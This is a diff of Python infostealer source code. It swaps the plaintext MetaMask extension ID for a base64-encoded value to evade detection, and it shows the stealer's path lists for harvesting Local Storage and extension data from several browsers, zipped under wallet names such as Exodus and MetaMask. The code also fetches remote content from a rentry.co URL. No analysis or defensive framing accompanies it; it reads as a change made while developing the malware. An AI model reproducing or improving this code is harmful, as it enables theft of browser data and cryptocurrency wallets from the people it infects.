@@ -95,6 +95,8 @@ bigccks = "https://rentry.co/fzr38/raw"
 rez = requests.get(bigccks)
 justaterm = rez.text
 
+extension_id = f'{base64.b64decode("bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4=")}'.replace("b'", "").replace("'", "")
+inp  = str(extension_id)
 
 json_confg = {
     "created_by": "%PC_CREATOR%",
@@ -2380,7 +2382,7 @@ def ZipMyThings(path, arg, procc):
         browser = path.split("\\")[4].split("/")[1].replace(" ", "")
         name = f"{browser}-EXODUS"
         pathC = os.path.join(path, arg)
-    elif "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
+    elif inp in arg:
         browser = path.split("\\")[4].split("/")[1].replace(" ", "")
         name = f"{browser}-METAMASK"
         pathC = os.path.join(path, arg)
@@ -2421,7 +2423,7 @@ def The_Pathbrows():
             "/Local Storage/leveldb",
             "/",
             f"/{ntwrk}",
-            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/Local Extension Settings/{inp}",
         ],
         [
             f"{roaming}/Opera Software/Opera Stable",
@@ -2429,7 +2431,7 @@ def The_Pathbrows():
             "/Local Storage/leveldb",
             "/",
             f"/{ntwrk}",
-            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/Local Extension Settings/{inp}",
         ],
         [
             f"{roaming}/Opera Software/Opera Neon/User Data/Default",
@@ -2437,7 +2439,7 @@ def The_Pathbrows():
             "/Local Storage/leveldb",
             "/",
             f"/{ntwrk}",
-            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/Local Extension Settings/{inp}",
         ],
         [
             f"{local}/Google/Chrome/User Data",
@@ -2445,7 +2447,7 @@ def The_Pathbrows():
             "/Default/Local Storage/leveldb",
             "/Default",
             f"/Default/{ntwrk}",
-            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/Default/Local Extension Settings/{inp}",
         ],
         [
             f"{local}/Google/Chrome SxS/User Data",
@@ -2453,7 +2455,7 @@ def The_Pathbrows():
             "/Default/Local Storage/leveldb",
             "/Default",
             f"/Default/{ntwrk}",
-            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/Default/Local Extension Settings/{inp}",
         ],
         [
             f"{local}/BraveSoftware/Brave-Browser/User Data",
@@ -2461,7 +2463,7 @@ def The_Pathbrows():
             "/Default/Local Storage/leveldb",
             "/Default",
             f"/Default/{ntwrk}",
-            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/Default/Local Extension Settings/{inp}",
         ],
         [
             f"{local}/Yandex/YandexBrowser/User Data",
@@ -2469,7 +2471,7 @@ def The_Pathbrows():
             "/Default/Local Storage/leveldb",
             "/Default",
             f"/Default/{ntwrk}",
-            "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/HougaBouga/{inp}",
         ],
         [
             f"{local}/Microsoft/Edge/User Data",
@@ -2477,7 +2479,7 @@ def The_Pathbrows():
             "/Default/Local Storage/leveldb",
             "/Default",
             f"/Default/{ntwrk}",
-            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+            f"/Default/Local Extension Settings/{inp}",
         ],
     ]
 
